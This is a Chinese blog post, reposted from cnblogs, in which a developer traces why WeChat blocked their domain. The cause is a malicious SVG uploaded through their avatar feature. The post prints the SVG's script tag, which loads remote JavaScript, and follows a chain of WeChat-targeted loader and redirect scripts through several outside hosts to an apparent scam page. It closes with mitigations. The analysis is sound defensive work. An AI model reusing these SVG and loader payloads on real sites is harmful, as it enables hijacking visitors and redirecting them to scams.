<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修【已停止访问该网页】由一张图片引发的“血案”' />
<script src='../../highlight/highlight.pack.js'></script>
<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>

<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
<script src='../../fenxiang/src/js/social-share.js'></script>
<script src='../../fenxiang/src/js/qrcode.js'></script>

</head><body><script>hljs.initHighlightingOnLoad();</script><script>
var system ={};  
var p = navigator.platform;       
system.win = p.indexOf('Win') == 0;  
system.mac = p.indexOf('Mac') == 0;  
system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
if(system.win||system.mac||system.xll){
document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
</div><div onclick='hidden1()' >分享</div>
</ul></div></div>
<div id='heading_nav2'> 
<li class='row' >
<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>【已停止访问该网页】由一张图片引发的“血案”</center></div><div class='banquan'>原文出处:本文由博客园博主Halburt提供。<br/>
原文连接:https://www.cnblogs.com/Halburt/p/10644037.html</div><br>
    <h3 id="先看个热闹">先看个热闹</h3>
<p>突然一天在微信上打不开我的域名了，被封了<br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”0.png" alt="image.png" /><br />
然后我要疯，我没有这个svg啊，虽然系统中有图片上传的地方，但是也不会用到这个svg啊<br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”1.png" alt="image.png" /></p>
<p>想想，可能有人通过我的系统免费上传了这个svg然后在其他地方用了这个免费的资源流量。</p>
<h3 id="下载这个svg文本编辑器打开源码">下载这个svg，文本编辑器打开源码</h3>
<pre><code><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;3.5in&quot; height=&quot;1in&quot;&gt;
    &lt;script type=&quot;text/javascript&quot; xlink:href=&quot;https://ookwqc.com/t&quot;&gt;&lt;/script&gt;
&lt;/svg&gt;</code></pre>
<h3 id="打开httpsookwqc.comt域名">打开https://ookwqc.com/t域名</h3>
<pre><code><code>
(function() {
            var ua = navigator.userAgent.toLowerCase();
            try { document.getElementsByTagName(&quot;body&quot;)[0].outerHTML = &quot;&lt;center&gt;Loading...&lt;/center&gt;&quot;; } catch (e) {};
            if (/micromessenger/.test(ua)) {
                if (top != window || !document.body) {
                    top.location.href = &#39;http://vcover.yayagushi.com/30004981820190320222503uc.jpg?now=1554189153&#39;;
                } else {
                    var a = document.createElement(&#39;a&#39;);
                    a.href = &#39;http://vcover.yayagushi.com/30004981820190320222503uc.jpg?now=1554189153&#39;;
                    a.rel = &#39;noreferrer&#39;;
                    a.click();
                }
            }
        })()</code></pre>
<p>上面一段代码写的很有意思，如果是微信浏览器打开是一张图片，否则是另外一张图片。<br />
但是————不要被后缀伪装给迷惑了。<br />
查询域名备案信息，哇塞备案了差不多500个域名，真流弊<br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”2.png" alt="image.png" /></p>
<h3 id="打开微信那张照片">打开微信那张照片</h3>
<p>页面空白，但是作为开发人员，打开F12，哇塞</p>
<p><img src="./images/【已停止访问该网页】由一张图片引发的“血案”3.png" alt="image.png" /></p>
<p>这个地址只是一个以jpg结尾的svg文件请求地址。<br />
其中https://05ez.com/t又去获取下一个地址<br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”4.png" alt="image.png" /></p>
<p>不死不休，继续追踪<u><a href="http://rf9maug.5ltj6b9d.tw/05d.html?now=1554192363" class="uri">http://rf9maug.5ltj6b9d.tw/05d.html?now=1554192363</a></u><br />
F12照看一下</p>
<pre><code><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
&lt;script src=&quot;https://05ez.com/d&quot;&gt;&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>继续找<u><a href="https://05ez.com/d" class="uri">https://05ez.com/d</a></u></p>
<pre><code><code>var _shareUrl = &#39;https://05ez.com&#39;;
var hm_c = &#39;a71a8a3c027d8f8703df08f83e95ef39&#39;;

function _getParam(name) {
    return location.href.match(new RegExp(&#39;[?&amp;]&#39; + name + &#39;=([^?&amp;#]+)&#39;, &#39;i&#39;)) ? decodeURIComponent(RegExp.$1) : &#39;&#39;;
}
var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/.test(ua)) {
    var _lay = document.createElement(&#39;div&#39;);
    _lay.setAttribute(&#39;style&#39;, &#39;width:100%;height:2048px;font-size:1.4em;position:absolute;&#39; +
        &#39;background-color:white;z-index:99999999;left:0;top:0;&#39;);
    _lay.innerHTML = &#39;&lt;div style=&quot;color:black;text-align:center;font-size:1.3em&quot;&gt;loading...&lt;/div&gt;&#39;;
    if (document.body) document.body.appendChild(_lay);
    document.title = &quot;正在打开...&quot;;
    var xhr = new XMLHttpRequest;
    var html = null;

    function getParam(name, url) {
        var r = new RegExp(&#39;(?|#|&amp;)&#39; + name + &#39;=(.*?)(#|&amp;|$)&#39;);
        var m = (url || location.href).match(r);
        return (m ? m[2] : &#39;&#39;)
    }
    function render() {
        var a = document.open(&quot;text/html&quot;, &quot;replace&quot;);
        a.write(html);
        a.close()
    }
    xhr.onload = function () {
        html = xhr.responseText;
        var delay = 0;
        if (delay &gt; 0) setTimeout(&quot;render()&quot;, delay * 1000); else render()
    };
    xhr.open(&quot;GET&quot;, &quot;https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/index.html?t=&quot; + Date.now(), !0);
    xhr.send();
}</code></pre>
<h3 id="打开上面的页面">打开上面的页面</h3>
<p><u><a href="https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/index.html" class="uri">https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/index.html</a></u></p>
<pre><code><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
  &lt;meta charset=&quot;utf-8&quot;&gt;
  &lt;title&gt;...&lt;/title&gt;
  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover&quot; /&gt;
  &lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;
  &lt;meta name=&quot;applicable-device&quot; content=&quot;mobile&quot;&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;//lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/js/d.css&quot;&gt;
  &lt;script&gt;
    window.focusLocation = {};
  &lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
  &lt;script src=&quot;//res.wx.qq.com/open/js/jweixin-1.0.0.js&quot;&gt;&lt;/script&gt;
  &lt;script src=&quot;//lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/js/jquery.min.js&quot;&gt;&lt;/script&gt;
  &lt;script src=&quot;//lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/js/core.js&quot;&gt;&lt;/script&gt;
  &lt;script src=&quot;https://05ez.com/case/info?var=window.data&quot;&gt;&lt;/script&gt;

  &lt;script&gt;
    // M.loadJS(&#39;/js/i_d.js?v=&#39; + (+new Date()));
    M.loadJS(&#39;https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/js/i_d.js?v=&#39; + (+new Date()));
  &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
<h3 id="瞅一眼那个js">瞅一眼那个JS</h3>
<p><u><a href="https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/js/i_d.js" class="uri">https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/js/i_d.js</a></u><br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”5.png" alt="js.png" /><br />
好了找到地方了，多么喜庆。<br />
<img src="./images/【已停止访问该网页】由一张图片引发的“血案”6.png" alt="image.png" /></p>
<p>找到问题就解决吧</p>
<h3 id="再来找找这个svg文件上传的日志">再来找找这个svg文件上传的日志</h3>
<p>2019-03-10T13:08:35.866304Z {&quot;Accept-Encoding&quot;:&quot;gzip&quot;,&quot;Content-Length&quot;:&quot;992&quot;,&quot;Content-Type&quot;:&quot;multipart/form-data; boundary=------------------------78ff25155c5e6156&quot;,&quot;IP&quot;:&quot;127.0.0.1&quot;,&quot;User-Agent&quot;:&quot;Go-http-client/1.1&quot;,&quot;X-Forwarded-For&quot;:&quot;112.96.135.XXX157.255.155.XXX&quot;X-Real-Ip&quot;:&quot;157.255.155.XXX&quot;X-Reqid&quot;:&quot;DQYAAMIr4LjhmooV&quot;,&quot;X-Scheme&quot;:&quot;http&quot;} {&quot;key&quot;:&quot;XXX.svg&quot;,&quot;hash&quot;:&quot;e5gx5xekD&quot;,&quot;bucket&quot;:&quot;&quot;,&quot;fsize&quot;:252}</p>
<h3 id="解决方案">解决方案</h3>
<p>1）限制系统中头像上传的文件类型为jpg/png (app端会裁剪照片，这2个类型够用）</p>
<p>2）如果使用第三方对象存储，建议修改秘钥</p>
<p>3）在nginx或者slb上限制该恶意ip，并设置SLB黑名单</p>

</div>
</div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>